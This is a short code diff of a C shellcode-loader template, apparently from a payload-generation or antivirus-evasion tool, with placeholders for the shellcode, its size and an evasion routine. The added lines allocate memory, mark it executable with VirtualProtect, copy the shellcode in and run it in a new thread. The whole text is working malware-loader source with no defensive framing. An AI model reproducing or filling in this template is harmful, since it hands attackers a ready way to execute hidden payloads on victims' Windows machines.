@@ -25,9 +25,14 @@ int main() {
         char VAR3[] = "[SHELLCODE]";
 	
 	[EVASION]
+
+
+	VOID *VAR4 = VirtualAlloc(NULL, [SHELLCODE_SIZE], 0x00002000 | 0x00001000, PAGE_READWRITE);
+	DWORD VAR2;
+	VirtualProtect(VAR4, [SHELLCODE_SIZE], 0x40, &VAR2);
+	memcpy(VAR4, VAR3, [SHELLCODE_SIZE]);
 		
-        int(*VAR4)(void);
-        VAR4 = (int(*)())VAR3;
-        VAR4();
+	HANDLE VAR11 = CreateThread(NULL, 0, VAR4, NULL, 0, NULL);
+	WaitForSingleObject(VAR11, 0xffffffff);
         return 0;
 }
